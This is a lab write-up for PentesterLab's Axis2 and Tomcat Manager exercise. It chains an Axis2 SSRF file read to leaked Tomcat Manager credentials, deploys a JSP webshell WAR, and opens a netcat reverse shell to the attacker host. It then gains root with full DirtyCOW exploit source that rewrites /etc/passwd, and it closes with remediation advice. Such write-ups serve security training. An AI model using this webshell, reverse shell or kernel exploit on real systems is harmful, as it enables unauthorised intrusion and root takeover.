# Axis2 and Tomcat Manager — Writeup

**Difficulty:** Medium (3/5)
**Category:** VulnHub / PentesterLab — Boot2Root
**OS:** Debian GNU/Linux 6.0.6 (Squeeze) — Kernel 2.6.32-5-amd64
**Platform:** PentesterLab
**Source:** https://pentesterlab.com/exercises/axis2-and-tomcat-manager

---

## Overview

A Debian 6 machine running Apache 2.2 with mod_jk forwarding requests to a back-end Tomcat 6 instance. The Axis2 web service exposes a `ProxyService` with SSRF via `file://` URIs, which leaks the Tomcat Manager credentials from `tomcat-users.xml`. Those credentials allow deploying a malicious WAR (JSP webshell), gaining remote code execution as `tomcat6`. The kernel (2.6.32) is vulnerable to DirtyCOW (CVE-2016-5195), which overwrites `/etc/passwd` to create a root-equivalent SSH user.

**Vulnerabilities:**
- Axis2 ProxyService SSRF — arbitrary file read via `file://` URI
- Exposed Tomcat Manager with harvested credentials
- CVE-2016-5195 (DirtyCOW) — kernel privilege escalation

**Proof of root:** `uid=0(firefart) gid=0(root) groups=0(root)`

---

## Prerequisites

- VirtualBox with the VM on a host-only network (e.g., `192.168.56.0/24`)
- Attacker IP assumed: `192.168.56.1` (adjust to match your host-only adapter)
- Tools: `nmap`, `curl`, `gcc`, `sshpass`, standard GNU toolchain

---

## Attack Summary

```
Axis2 ProxyService SSRF (file:///etc/tomcat6/tomcat-users.xml)
  → credentials manager:!mp0ss!bl32gu355
  → Tomcat Manager WAR deploy
  → JSP webshell (tomcat6, uid=103)
  → DirtyCOW CVE-2016-5195
  → /etc/passwd overwrite → firefart:firefart (uid=0)
  → SSH root access
```

---

## Enumeration

### Host Discovery

```bash
nmap -sn 192.168.56.0/24
```

Identify the target IP (Debian host). In this lab: `192.168.56.104`.

### Port Scan

```bash
nmap -sV -p 22,80,8005,8009 192.168.56.104
```

Expected output:
```
22/tcp   open  ssh     OpenSSH (protocol 2.0; RSA/DSS keys only)
80/tcp   open  http    Apache httpd 2.2.16 (Debian)
8005/tcp filtered  (Tomcat shutdown — loopback only)
8009/tcp filtered  (Tomcat AJP — loopback only)
```

Port 80 is Apache with `mod_jk` proxying to Tomcat 6 via AJP 8009. Tomcat itself is not directly exposed.

### Service Enumeration

**Discover Axis2:**
```bash
curl -s http://192.168.56.104/ | grep -i axis
# Navigate to http://192.168.56.104/axis2/
```

**List available Axis2 services:**
```bash
curl -s "http://192.168.56.104/axis2/services/listServices"
```

Expected output (relevant portion):
```xml
<serviceGroup name="ProxyService">
  <service name="ProxyService">
    <operation name="get"/>
  </service>
</serviceGroup>
```

**Inspect the WSDL to discover the `uri` parameter:**
```bash
curl -s "http://192.168.56.104/axis2/services/ProxyService?wsdl" | grep -E 'get|uri'
```

Key finding: `get` operation accepts a `uri` (string) parameter and proxies the request — including `file://` URIs.

---

## Exploitation

### Step 1 — SSRF: Read /etc/passwd to confirm file:// support

```bash
curl -s "http://192.168.56.104/axis2/services/ProxyService/get?uri=file:///etc/passwd"
```

Expected output: contents of `/etc/passwd`, confirming arbitrary file read via SSRF.

### Step 2 — SSRF: Harvest Tomcat Manager credentials

```bash
curl -s "http://192.168.56.104/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml"
```

Expected output:
```xml
<tomcat-users>
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="tomcat" roles="tomcat"/>
  <user username="manager" password="!mp0ss!bl32gu355" roles="tomcat,manager-gui"/>
</tomcat-users>
```

Credentials: **`manager:!mp0ss!bl32gu355`** with `manager-gui` role.

*Bonus — read Axis2 admin credentials:*
```bash
curl -s "http://192.168.56.104/axis2/services/ProxyService/get?uri=file:///var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml"
# Returns: admin:axis2
```

### Step 3 — Build the JSP webshell WAR

```bash
mkdir -p /tmp/ws/WEB-INF

cat > /tmp/ws/cmd.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) { sb.append(line).append("\n"); }
    p.waitFor();
    out.print(sb.toString());
}
%>
EOF

cat > /tmp/ws/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app><display-name>Shell</display-name></web-app>
EOF

cd /tmp/ws && jar -cvf /tmp/axshell.war .
```

### Step 4 — Extract the CSRF token and deploy the WAR

```bash
CSRF=$(curl -s -u "manager:!mp0ss!bl32gu355" \
  "http://192.168.56.104/manager/html" \
  -c /tmp/axis_cookies.txt \
  | grep -oP 'org\.apache\.catalina\.filters\.CSRF_NONCE=[A-F0-9]+' \
  | head -1 | cut -d= -f2)

echo "CSRF token: $CSRF"
```

```bash
curl -s -u "manager:!mp0ss!bl32gu355" \
  -b /tmp/axis_cookies.txt \
  "http://192.168.56.104/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF" \
  -F "deployWar=@/tmp/axshell.war;type=application/octet-stream" | grep -i "OK\|deployed"
```

### Step 5 — Confirm RCE

```bash
curl -s -X POST "http://192.168.56.104/axshell/cmd.jsp" \
  --data-urlencode "cmd=id"
```

Expected output:
```
uid=103(tomcat6) gid=106(tomcat6) groups=106(tomcat6)
```

### Step 6 — Get a reverse shell

On the attacker machine:
```bash
nc -lvnp 4445
```

Trigger the shell (note: Debian 6's `nc` supports `-e`):
```bash
curl -s -X POST "http://192.168.56.104/axshell/cmd.jsp" \
  --data-urlencode "cmd=nc -e /bin/bash 192.168.56.1 4445"
```

You now have an interactive shell as `tomcat6 (uid=103)`.

---

## Privilege Escalation

### Kernel version check

```bash
uname -r
# Linux debian 2.6.32-5-amd64
```

Kernel 2.6.32 falls in the DirtyCOW vulnerable range (2.6.22 – 4.8.3).

### CVE-2016-5195 (DirtyCOW) — madvise + /proc/self/mem variant

**How it works:** Two threads race against each other — one calls `madvise(MADV_DONTNEED)` on a private read-only mapping of `/etc/passwd`, the other writes to `/proc/self/mem` at the same offset. The race causes the kernel to write through the copy-on-write mechanism to the underlying physical page, effectively writing to the read-only file.

**On the attacker machine, compile a static binary:**

```bash
cat > /tmp/dc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map; int f; struct stat st;

void *madviseThread(void *arg) {
    int i, c = 0;
    for (i = 0; i < 200000000; i++)
        c += madvise(map, 100, MADV_DONTNEED);
    printf("madvise %d\n", c);
    return NULL;
}

void *procselfmemThread(void *arg) {
    char *str = (char *)arg;
    int f = open("/proc/self/mem", O_RDWR), i, c = 0;
    for (i = 0; i < 200000000; i++) {
        lseek(f, (uintptr_t)map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("procselfmem %d\n", c);
    return NULL;
}

int main() {
    // DES hash of "firefart" with salt "firefart"
    char *payload = "firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash\n";
    f = open("/etc/passwd", O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
    pthread_t pth1, pth2;
    pthread_create(&pth1, NULL, madviseThread, payload);
    pthread_create(&pth2, NULL, procselfmemThread, payload);
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
EOF

gcc -static -o /tmp/dc /tmp/dc.c -lpthread
```

> **`-static` is required** — the target's glibc is old; a dynamically linked binary will fail with linker errors.

**Back up `/etc/passwd` before running:**
```bash
# On the target (via webshell or reverse shell):
cp /etc/passwd /tmp/passwd.bak
```

**Transfer and execute:**
```bash
# On attacker: serve the binary
python3 -m http.server 8888 --directory /tmp &

# On target:
wget http://192.168.56.1:8888/dc -O /tmp/dc && chmod +x /tmp/dc
/tmp/dc > /tmp/dc_out.txt 2>&1 &
```

Wait ~30 seconds for the race to complete, then verify:
```bash
head -1 /etc/passwd
```

Expected output:
```
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash
```

---

## Root Access

```bash
sshpass -p firefart ssh \
  -o StrictHostKeyChecking=no \
  -o HostKeyAlgorithms=ssh-rsa \
  firefart@192.168.56.104 \
  "id && hostname && uname -r"
```

Expected output:
```
uid=0(firefart) gid=0(root) groups=0(root)
debian
2.6.32-5-amd64
```

**Root achieved.**

> **Cleanup:** Restore `/etc/passwd` before shutting down the VM:
> ```bash
> sshpass -p firefart ssh -o HostKeyAlgorithms=ssh-rsa firefart@192.168.56.104 \
>   "cp /tmp/passwd.bak /etc/passwd"
> ```

---

## Lessons Learned

1. **Axis2 ProxyService SSRF via `file://`:** The service exposes an HTTP proxy with no protocol restriction. Any URI scheme the JVM supports — including `file://` — is proxied back to the caller, enabling arbitrary local file read.

2. **Tomcat credential file locations:** On Debian/Ubuntu the file lives at `/etc/tomcat6/tomcat-users.xml` (symlinked from `/var/lib/tomcat6/conf/`). On RHEL/CentOS it is under `$CATALINA_HOME/conf/`. Always try both paths.

3. **DirtyCOW madvise+procmem variant:** More portable than the ptrace variant; does not require `ptrace` permissions. Effective on any kernel in the range 2.6.22–4.8.3.

4. **Static compilation for old targets:** When the exploit must run on a system with an old glibc, compile with `-static` on the attacker machine to avoid linker errors on the target.

5. **SSH legacy algorithm flag:** Modern OpenSSH rejects `ssh-rsa` and `ssh-dss` by default. Use `-o HostKeyAlgorithms=ssh-rsa` when connecting to legacy servers.

---

## Remediation

| Finding | Fix |
|---------|-----|
| Axis2 ProxyService SSRF | Restrict allowed URI schemes to `http://` and `https://`; deny `file://`, `ftp://`, and internal RFC-1918 ranges |
| Weak/guessable Tomcat Manager password | Change default credentials; restrict Manager access to localhost or a VPN-only IP |
| Tomcat Manager exposed externally | Remove or IP-restrict `/manager/` and `/host-manager/` in `context.xml` |
| DirtyCOW (CVE-2016-5195) | Upgrade kernel to ≥ 4.8.3 |
| Sensitive config files world-readable | Restrict `tomcat-users.xml` to `tomcat6:tomcat6 640` |
